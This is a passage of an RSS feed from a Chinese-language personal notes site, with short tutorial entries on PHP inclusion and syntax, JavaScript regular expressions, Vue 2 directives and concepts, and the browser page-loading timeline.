      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid>
      <description>文件包含 在一个 PHP 脚本中，将另一个文件的代码插入到当前文件，并使用另一个文件中的方法、变量等等。
用于实现代码模块化。
被包含的文件是单独进行编译的
包含方式 include() 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。
include()引入的文件有错误时，会继续执行，并返回一个警告。
include once() 检查当前文件是否已经在前面被引入过了，如果已经引入过，则不在引入。
可以避免某写代码重新执行而报错，比如重复引入导致常量重复定义。
require() 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件。
require()引入的文件有错误时，执行会中断，并返回一个致命错误。
require onec() 检查当前文件是否已经在前面被引入过了，如果已经引入过，则不在引入。
可以避免某写代码重新执行而报错，比如重复引入导致常量重复定义。</description>
    </item>
    
    <item>
      <title>PHP 流程控制代替语法</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%BB%A3%E6%9B%BF%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%BB%A3%E6%9B%BF%E8%AF%AD%E6%B3%95/</guid>
      <description>流程控制代替语法 代替 for PHP 本身是嵌入到 HTML 中的脚本语言，因此，我们可以这样书写：
// 生成了九个一级标题元素。 &amp;lt;?php for ($i = 1; $i &amp;lt; 10; $i++) { ?&amp;gt;&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt; &amp;lt;?php } ?&amp;gt; 但是，如果我们以上面这种方式将 PHP 代码嵌入到 HTML 中，那么{}给我们所带来的观感是非常不好的。
因此， PHP 提供了一种代替{}的机制：
&amp;lt;?php for ($i = 1; $i &amp;lt; 10; $i++) : ?&amp;gt;&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt; &amp;lt;?php endfor; ?&amp;gt; 同样的，除了for，PHP 还支持 if、switch、while、foreach：
&amp;lt;?php if (1 &amp;lt; 2) : ?&amp;gt;&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt; &amp;lt;?php endif; ?&amp;gt; </description>
    </item>
    
    <item>
      <title>PHP 运算符</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>运算符 错误抑制符 在 PHP 中 有一些错误可以提前预知，但是这些错误可能无法避免，但又不希望报错给用户看，可以使用错误抑制符@()处理。
&amp;lt;?php $a = 10; $b = 0; @($c = $a / $b);  echo $c; 错误抑制符通常在生产环境（上线）会用到，在开发的时候不会用系统本身最好没有任何。</description>
    </item>
    
    <item>
      <title>RegExp 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E5%B1%9E%E6%80%A7/</guid>
      <description>RegExp 属性 lastIndex 从 0 开始，表示字符在进行下一次匹配时的起始位置，这个属性会被exec()和test()用到。
该属性可以被手动修改。
var reg = /ab/g;  var str = &amp;#39;abababab&amp;#39;;  // 第一次匹配，lastIndex 变为 2 console.log(reg.exec(str)); // lastIndex = 2 console.log(reg.lastIndex); //手动修改 lastIndex reg.lastIndex = 0; // 修改成功，lastIndex = 2 console.log(reg.exec(str)); </description>
    </item>
    
    <item>
      <title>RegExp 量词</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E9%87%8F%E8%AF%8D/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E9%87%8F%E8%AF%8D/</guid>
      <description>量词 表示数量。
n+ 匹配 n 一次或多次，等价于 {1,}。
var reg = /a+/g;  var str = &amp;#39;aavva&amp;#39;;  var result = str.match(reg); console.log(result); n* 匹配 n 零次或多次。等价于{0,}。
var reg = /a*/g;  var str = &amp;#39;aavva&amp;#39;;  var result = str.match(reg); console.log(result); n? 匹配 n 零次或一次。等价于 {0,1}。
var reg = /a?/g;  var str = &amp;#39;aavva&amp;#39;;  var result = str.match(reg); console.log(result); n{x} 匹配 n 表达式 x 次。x 是一个非负整数。
var reg = /o{2}/g;  var str = &amp;#39;boooody&amp;#39;;  var result = str.</description>
    </item>
    
    <item>
      <title>Vue computd</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</guid>
      <description>computd 通过已有的属性计算出来的属性。
计算属性最终会出现在 Vue 实例上，直接调用即可。
如果计算属性有可能被修改，那必须写set()去响应修改，且要引起计算属性所依赖的属性发生变化。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;p&amp;gt;姓：{{ firstName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;名：{{ lastName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;全名：{{ fullName }}&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	firstName: &amp;#39;苏&amp;#39;, 	lastName: &amp;#39;明敏&amp;#39;, 	}, 	computed: { 	fullName: { 	get() { 	return this.firstName + &amp;#39;-&amp;#39; + this.lastName; 	}, 	set(value) { 	var arr = value.</description>
    </item>
    
    <item>
      <title>Vue key</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</guid>
      <description>key 表示节点的唯一标识key。
使用 v-for 时，如果不给元素加上 key，那么 Vue 会默认将 index当作元素的key。
该属性可以干预diff 算法，在同一层级，key值相同的节点会进行比对，key值不同的节点则不会比对。
在循环生成的节点中，vue 强烈建议给予每个节点唯一且稳定的 key 值。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-if=&amp;#34;handoff === &amp;#39;login&amp;#39;&amp;#34;&amp;gt; &amp;lt;label&amp;gt;登录&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;1&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div v-else&amp;gt; &amp;lt;label&amp;gt;注册&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;lt;!-- handoff 等于：如果 login 为 true，则 handoff === register，否则 handoff === login --&amp;gt; &amp;lt;button @click=&amp;#34;handoff = handoff === &amp;#39;login&amp;#39;?&amp;#39;register&amp;#39;:&amp;#39;login&amp;#39;&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	handoff: &amp;#39;login&amp;#39;, 	}, }); Vue.</description>
    </item>
    
    <item>
      <title>Vue ref</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/ref/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/ref/</guid>
      <description>ref 用于给元素或子组件注册唯一标识，这个唯一标识将会被注册到父组件的 $refs 对象上。
对于 HTML 元素，获取的是 DOM 元素，与 id 是一样的；对于组件，获取的是组件实例对象。
$refs 不是响应式的属性。</description>
    </item>
    
    <item>
      <title>Vue v-for</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</guid>
      <description>v-for 循环渲染元素。
当和 v-if 一起使用时，v-for 的优先级比 v-if 更高。
可以用 of 替代 in 作为分隔符，因为它更接近 JavaScript 迭代器的语法。
不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;ul&amp;gt; 	&amp;lt;li v-for=&amp;#34;(p,index) in persons&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;{{p.name}} and {{p.age}}&amp;lt;/li&amp;gt; 	&amp;lt;/ul&amp;gt;  	&amp;lt;ul&amp;gt; 	&amp;lt;li v-for=&amp;#34;(f,index) in fruits&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;{{f}}&amp;lt;/li&amp;gt; 	&amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	// 遍历数组 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;小明&amp;#39;, age: 9 }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;小苏&amp;#39;, age: 21 }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;小朱 &amp;#39;, age: 20 }, 	], 	// 遍历对象 	fruits: { 	name: &amp;#39;banana&amp;#39;, 	color: &amp;#39;yellow&amp;#39;, 	kg: &amp;#39;3kg&amp;#39;, 	}, 	}, });  Vue.</description>
    </item>
    
    <item>
      <title>Vue v-if</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</guid>
      <description>v-if 控制元素是否存在。
如果多个 if 指令：v-if、v-else、v-else-if连用，则使用它们的元素必须紧挨。
在 &amp;lt;template&amp;gt; 元素上使用 v-if 时，最终的渲染结果将不包含 &amp;lt;template&amp;gt; 元素。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 如果 isShow 为 true，则插入 img，如果 isShow 为 false，则移除 img --&amp;gt;  &amp;lt;img v-if=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;!-- 否则（img 已移除），则显示 button 元素，如果 img 已插入，则移除 button--&amp;gt; &amp;lt;button v-else=&amp;#34;!isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-on</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</guid>
      <description>v-on 注册一个事件，可简写为@。
支持一些指令修饰符，比如 prevent。
事件函数必须存在于methods中，事件参数为event。
&amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-on:click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 缩写 --&amp;gt; &amp;lt;a @click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; 调用事件函数时
 不加括号，调用事件函数就可以直接获取到该函数的事件对象。 加了 ()， 除了可以使用$event来获取事件对象，还能传入其他的参数。  &amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo2($event,6666)&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue v-show</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</guid>
      <description>v-show 控制元素是否可见，如果元素不可见，则该元素display:none。
HTML &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-show=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;button @click=&amp;#34;isShow = !isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39; }, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 挂载</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</guid>
      <description>挂载 将生成的真实 DOM 树，插入到页面上的过程，称之为挂载。
挂载方式 通过el:&#39;CSS 选择器&#39;来挂载。
new Vue({ 	// vue 代码 }).$mount(&amp;#39;#app&amp;#39;); 通过Vue 实例.$mount(&#39;CSS 选择器&#39;)进行稍后挂载。
// 或者 var v = Vue({ 	// vue 代码 }); v.$mount(&amp;#39;#app&amp;#39;); </description>
    </item>
    
    <item>
      <title>Vue 指令</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</guid>
      <description>指令 用于解析元素（属性、内存、事件等），比如使用v-binds:url来进行解析，使得该属性成为动态属性。其中 url必须是 JavaScrip 表达式，也可以直接读取 data 中的数据。
Vue 中的指令始终以v-开头。</description>
    </item>
    
    <item>
      <title>Vue 指令修饰符</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>指令修饰符 prevent 阻止元素默认行为，比如 a 元素的跳转。
指令修饰符可以连写，先阻止元素默认行为，再阻止元素冒泡。
&amp;lt;a @click.prevent.stop=&amp;#34;btn&amp;#34; href=&amp;#34;https://ke.qq.com/&amp;#34;&amp;gt;123&amp;lt;/a&amp;gt; stop 阻止元素的事件冒泡。
once 事件只触发一次
capture 使用事件的捕获模式
self 只有 event.target 是当前操作的元素时，才触发该事件
&amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;!--因为触发事件冒泡 target 不是 div，而是 button--&amp;gt;  &amp;lt;!--所以点击 button 不会触发事件冒泡--&amp;gt;  &amp;lt;div @click.self=&amp;#39;showInfo2&amp;#39;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; passive 事件的默认行为立即执行，无需等待事件的回调执行完毕</description>
    </item>
    
    <item>
      <title>Vue 注入</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</guid>
      <description>注入 配置的实例对象中的部分内容会被提取到 Vue 实例中：
 data:{} methods: {}  该过程称之为注入，注入的目的有两个：
完成数据响应式 Vue 是如何知道数据被更改的？
vue 2.0，是通过object.defineProperty()完成的数据响应式。该方法有很多缺陷，比如我们新增或删除data中的属性，此时的页面会无法正常响应。
vue 3.0，是通过 Class proxy。
绑定 this 通过 bind()来改变 this 的指向。</description>
    </item>
    
    <item>
      <title>Vue 组件化</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96/</guid>
      <description>组件化 将页面按照功能细分为若干个区域，每一个区域就是一个组件，每个组件包含：
 功能（JS） 内容（模板） 样式（CSS）  作用 复用编码、简化项目编码、提高运行效率。</description>
    </item>
    
    <item>
      <title>Vue 虚拟 DOM 树</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</guid>
      <description>虚拟 DOM 树 它是一个普通的对象，对应着真实的 DOM 树；虚拟 DOM 树的节点都是虚拟的节点。
为了提高效率，vue 会把模板编译成为虚拟 DOM 树，然后生成真实 DOM 树。
因为浏览器如果直接修改真实的 DOM 树，这是非常影响效率的，但如果修改一个对象，那么效率是非常高的。
有什么用 当数据更改时，会将更改后的内容编译成一棵新的虚拟 DOM 树，然后将其与旧的虚拟 DOM 树比对（diff算法），仅将两棵虚拟 DOM 属有差异的节点渲染为真实 DOM 树，没有差异的节点则直接使用旧虚拟 DOM 树所对应的真实 DOM 树上的节点（复用）。这样可最小程度的改动真实 DOM，提升页面渲染效率。
因此，对于 Vue 而言，提升效率重点在于两个方面：
  减少新的虚拟 DOM 的生成。
  保证虚拟 DOM 树对比之后，只有必要的节点发生变化。
  如何生成虚拟 DOM 树 生成虚拟 DOM 树的方式：
 在挂载的元素内部直接书写，此时使用元素的outerHTML作为模板。优先级最低。 在template配置中书写,，它是一个模板字符串。优先级比第一种方式高。 在render()中直接创建虚拟节点树，此时，完全脱离模板（无需模板解析器代码），这会省略将模板编译为虚拟 DOM 树的步骤。优先级最高。  当我们将 Vue 编译为浏览器可识别的 HTML 代码的时候，此时已无需使用模板解析器，因此，我们可以直接引入只有 Vue 核心代码（不包含模板解析器代码，无法使用template配置项）的vue.runtime.xxx.js，来精简我们的项目。    使用render()循环创建 1—6 级标题：</description>
    </item>
    
    <item>
      <title>VueComponent</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/vuecomponent/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/vuecomponent/</guid>
      <description>VueComponent   一个组件的本质是一个名为VueComponent()的构造函数， 且不是程序员定义的，是Vue. extend()生成的。
  我们只需要应用某个组件，像这样&amp;lt;school&amp;gt;&amp;lt;/school&amp;gt;，Vue 解析时会帮我们创建这个school组件的实例对象，即 Vue 内部会执行：new VueComponent(options).
  每次调用 Vue.extend()时，都会重新定义一个全新的VueComponent()。此，每次调用Vue.extend()时，返回的都是一个全新的VueComponent()，
  关于 this 的指向：
 在 Vue 实例中，data、methods、watch、computed 配置中的普通函数，其 this 指向都是 Vue 实例对象。 在组件实例中，data、methods、watch、computed 配置中的普通函数，其 this 指向都是VueComponent 实例对象。    Vue 实例简称vm、组件实例简称 vc。
  $children属性表示了当前实例（Vue 实例和组件实例）上的子实例。
  </description>
    </item>
    
    <item>
      <title>JavaScrip 时间线</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%97%B6%E9%97%B4%E7%BA%BF/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%97%B6%E9%97%B4%E7%BA%BF/</guid>
      <description>时间线 浏览器加载一个页面时，当开始执行 JavaScrip 的那一刻，浏览器会有一个特定的加载顺序，按照这个加载顺序一步步的执行的过程，就会形成一个时间线。
顺序 大致就三步：创建 Document ——&amp;gt; DOMTree 解析完毕，文档加载完毕并执行完毕。
 创建 Document 对象，开始解析 Web 页面。 解析 HTML 元素和它们的文本内容后添加 Element 对象和 Text 节点到文档中。此时的document.readyState = &#39;loading&#39;。 如遇到 link 引入的外部 CSS，那么创建线程加载这个 CSS，并继续解析文档。 遇到 script 引入的外部 JS，并且没有设置异步 async、defer 等，浏览器则同步加载这个 JS 文件，并阻塞，等待 JS 加载完成并执行该脚本，然后继续解析文档。 遇到 script 引入的外部 JS，井且设置有异步 async、defer 等，浏览器创建异步线程加载，井继续解析文档。对于 async 属性的脚本，脚本加载完成后立即执行。(异步加载的 JS 文件，其中禁止使用 document.write()) 遇到 img 等有 src 属性的元素，先正常解析 DOM 结构，然后浏览器异步加载 src，并继续解析文档。 当文档（DOMTree）解析完成，此时的document.readyState = &#39;interactive&#39;。 文档解析完成后，所有设置有 defer 的脚本会按照顺序执行。（注意与 async 的不同,但同样禁止使用 document.write()） document 对象触发 DOMContentLoaded 事件，这也标志着程序执行从同步脚本执行阶段，转化为事件驱动阶段。 当所有 async 的脚本加载完成并执行完毕后、img 等加载完成后，document.</description>
    </item>
    
    <item>
      <title>RegExp</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>RegExp 一种查找以及字符串替换的操作。
直接量（推荐使用） var reg = /abcde/i;  var str = &amp;#39;abCDE&amp;#39;;  var result = reg.test(str); console.log(result); new RegExp var str = &amp;#39;abCDE&amp;#39;; var reg = new RegExp(&amp;#39;abc&amp;#39;, &amp;#39;i&amp;#39;); var result = reg.test(str); console.log(result); 贪婪匹配 匹配时，能多匹配，就不会少匹配。
正则表达式默认的匹配模式就是贪婪匹配。
非贪婪匹配 匹配时，能少匹配，就不会多匹配。
+? 重复 1 次或更多次，但尽可能少重复。
var str = &amp;#39;aaaa&amp;#39;; var reg = /a+?/g; var result = str.match(reg); console.log(result); 除了+?，还有：
*? 重复任意次，但尽可能少重复。
?? 重复 0 次或 1 次，但尽可能少重复。
{n,m}? 重复 n 到 m 次，但尽可能少重复。</description>
    </item>
    
    <item>
      <title>RegExp 修饰符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>修饰符 i 不区分大小写，即 A 和 a 没有区别。
var reg = /abcde/i;  var str = &amp;#39;abCDE&amp;#39;;  var result = reg.test(str); console.log(result); g 全局匹配。查找字符串中所有的匹配项。
即匹配到一个匹配项后，还会继续匹配后续的字符串，它找出字符串中所有的匹配项。
var reg = /ab/g; var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); 如果不加该修饰符，则只匹配一个匹配项：
var reg = /ab/; var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); m 多行匹配，通常需要配合g来用。用边界字符^表示只匹配每一行的开头，用$匹配每一行的结尾，注意时是多行匹配，而不是整个字符串的开头和结尾。
var reg = /^a/gm;  var str = &amp;#39;abcababa\nabab&amp;#39;;  var result = str.match(reg); console.</description>
    </item>
    
    <item>
      <title>RegExp 元字符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%85%83%E5%AD%97%E7%AC%A6/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%85%83%E5%AD%97%E7%AC%A6/</guid>
      <description>元字符 \n 将 n 标记为一个特殊字符（将特殊字符进行转义）、或一个原义字符、或一个向后引用、或一个八进制转义符。
\w 匹配字母、数字、下划线。等价于[A-Za-z0-9_]。
var reg = /\wcd2/g;  var str = &amp;#39;bcd2&amp;#39;;  var result = str.match(reg); console.log(result); \W 匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]。
var reg = /\Wcd2/g;  var str = &amp;#39;b*cd2&amp;#39;;  var result = str.match(reg); console.log(result); \d 匹配一个数字字符。等价于 [0-9]。
\D 匹配一个非数字字符。等价于 [^0-9]。
\s 匹配任何空白字符，包括空格符、制表符\t、回车符\r、换行符\n、垂直制表符\v、换页符\f。
等价于 [ \f\n\r\t\v]。
\S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
\b 匹配一个单词边界，也就是指单词和空格间的位置。
例如， er\b可以匹配 never 中的 &amp;rsquo;er&amp;rsquo;，但不能匹配 verb 中的 er。
var reg = /\bname/g;  var str = &amp;#39;my name is rainy&amp;#39;;  var result = str.</description>
    </item>
    
    <item>
      <title>RegExp 实例</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%AE%9E%E4%BE%8B/</guid>
      <description>实例 匹配字符串首或尾是数字的字符串 var reg = /^\d|\d$/g;  var str = &amp;#39;2dfds&amp;#39;;  var result = str.match(reg); console.log(result); 匹配字符串首尾都是数字的字符串 var reg = /^\d[\s\S]*\d$/g;  var str = &amp;#39;2dfds2&amp;#39;;  var result = str.match(reg); console.log(result); 将以 - 分割的字符串变为小驼峰式的字符串 var str = &amp;#39;the-first-name&amp;#39;; var reg = /-(\w)/g; var result = str.replace(reg, function ($, $1) { 	return $1.toUpperCase(); }); console.log(result); 字符串去重 var str = &amp;#39;aaaabbbbccccddddd&amp;#39;; var reg = /(\w)\1+/g; var result = str.replace(reg, &amp;#39;$1&amp;#39;); console.</description>
    </item>
    
    <item>
      <title>RegExp 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E6%96%B9%E6%B3%95/</guid>
